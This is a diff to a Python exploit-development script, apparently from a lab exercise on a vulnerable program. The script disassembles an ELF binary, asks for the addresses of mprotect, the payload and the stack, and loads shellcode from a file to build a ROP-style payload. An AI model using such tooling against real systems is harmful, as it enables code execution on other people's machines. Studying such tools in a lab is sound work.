@@ -6,7 +6,8 @@ import ast
 from capstone import *
 from elftools.elf.elffile import ELFFile
 from elftools.elf.relocation import RelocationSection
-filename= 'a.out'
+#filename= 'a.out'
+filename = input("Input path of binary:")
 
 #values for modified voln_prog2:
 '''
@@ -131,7 +132,7 @@ if (shortest_rdi == 100) or (shortest_rsi == 100) or (shortest_rdx == 100):
 
 baseOfBinary = input("Input base of the binary in hex, including the leading \"0x\": ")
 addressOfMprotect = input("Input address of mprotect (PLT or libc is fine), including leading  \"0x\": ")
-addressOfPayload = input("Input address of start of ROP payload, including leading  \"0x\": ")
+addressOfPayload = input("Input address of start of payload, including leading  \"0x\": ")
 baseOfStack = input("Input address of the base of the stack, including leading  \"0x\": ")
 fileForShellcode = input("Input path of file for shellcode input: ")
 shellcodeFile = open(fileForShellcode,'r')
@@ -159,7 +160,8 @@ print(b)
 c = bytearray(b, encoding='latin1')
 print(c)
 print(type(c))
-shellcode = bytearray(c.decode('unicode-escape').encode('ISO-8859-1'))
+shellcode = c.decode('unicode-escape').encode('ISO-8859-1')
+shellcode = shellcode[:-2]
 print(shellcode)
 print(type(shellcode))
 #shellcode = encode(shellcodeString.encode().decode('unicode_escape'), "raw_unicode_escape")
